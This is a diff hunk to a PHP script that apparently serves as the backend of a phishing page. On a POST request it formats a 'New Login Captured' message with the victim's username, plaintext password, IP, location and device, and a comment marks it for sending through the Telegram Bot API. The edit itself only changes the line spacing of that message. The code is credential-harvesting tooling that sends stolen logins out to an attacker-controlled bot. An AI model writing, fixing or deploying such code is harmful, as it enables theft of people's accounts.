@@ -20,11 +20,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         : "Unknown Location";
 
     // Format the message
-    $message = "🔐 *New Login Captured*\n";
-    $message .= "👤 Username: `$username`\n";
-    $message .= "🔑 Password: `$password`\n";
-    $message .= "🌍 IP: `$ip` | $location\n";
-    $message .= "🧠 Device: `$userAgent`\n";
+    $message = "🔐 *New Login Captured*\n\n";
+    $message .= "👤 Username: `$username`\n\n";
+    $message .= "🔑 Password: `$password`\n\n";
+    $message .= "🌍 IP: `$ip` | $location\n\n";
+    $message .= "🧠 Device: `$userAgent`\n\n";
     $message .= "🕒 Time: `$timestamp`";
 
     // Telegram Bot API Details
